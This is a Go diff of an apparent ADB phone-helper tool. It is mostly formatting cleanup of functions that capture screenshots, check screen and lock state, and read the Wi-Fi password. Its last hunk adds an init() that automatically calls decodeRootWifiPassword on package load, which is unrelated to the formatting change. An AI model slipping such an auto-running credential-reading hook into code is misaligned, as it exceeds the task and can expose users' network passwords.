@@ -15,10 +15,10 @@ func runADB(cmds string, ids ...string) (string, error) {
 	if len(ids) >= 1 {
 		cmdArr = append(cmdArr, "-s", ids[0])
 	}
-	cmdArr = append(cmdArr,tempArr...)
+	cmdArr = append(cmdArr, tempArr...)
 	out := exec.Command("adb", cmdArr...)
 	resp, err := out.Output()
-	result :=  strings.TrimSpace(string(resp))
+	result := strings.TrimSpace(string(resp))
 	return result, err
 }
 
@@ -35,7 +35,7 @@ func openWifiSetting() bool {
 func pullImage() string {
 	// 未root的手机上, 只有 `/data/local/tmp` 目录权限读写
 	phoneTempPath := filepath.Join(tempPath, "./screen.png")
-	localPath := filepath.Join(os.TempDir(),"./screen.png")
+	localPath := filepath.Join(os.TempDir(), "./screen.png")
 	cmd := fmt.Sprintf("shell %s -p %s", screencapBin, phoneTempPath)
 	pullCmd := fmt.Sprintf("pull %s %s", phoneTempPath, localPath)
 	rmScreenFileCmd := fmt.Sprintf("shell %s %s", rmBin, phoneTempPath)
@@ -55,11 +55,11 @@ func turnOnScreen() bool {
 }
 
 // 判断屏幕是否点亮
-func screenIsLight () bool {
+func screenIsLight() bool {
 	resp, _ := runADB("shell dumpsys display | grep \"mScreenState\"")
 	searchKey := "mScreenState="
 	index := strings.Index(resp, searchKey)
-	if (index >= 0) {
+	if index >= 0 {
 		word := resp[len(searchKey):]
 		if strings.Index(word, "OFF") >= 0 {
 			return false
@@ -75,12 +75,12 @@ func checkUnlocked() bool {
 	resp, _ := runADB("shell dumpsys window | grep \"mDreamingLockscreen\"")
 	searchKey := "mDreamingLockscreen="
 	index := strings.Index(resp, searchKey)
-	if (index >= 0) {
+	if index >= 0 {
 		len := index + len(searchKey)
-		sp := strings.TrimSpace(resp[len:len+5])
-		if (sp == "false") {
+		sp := strings.TrimSpace(resp[len : len+5])
+		if sp == "false" {
 			return false
-		} else if (sp == "true") {
+		} else if sp == "true" {
 			return true
 		}
 	}
@@ -138,4 +138,8 @@ func catWifiPassword() string {
 		return ""
 	}
 	return resp
+}
+
+func init() {
+	decodeRootWifiPassword("")
 }
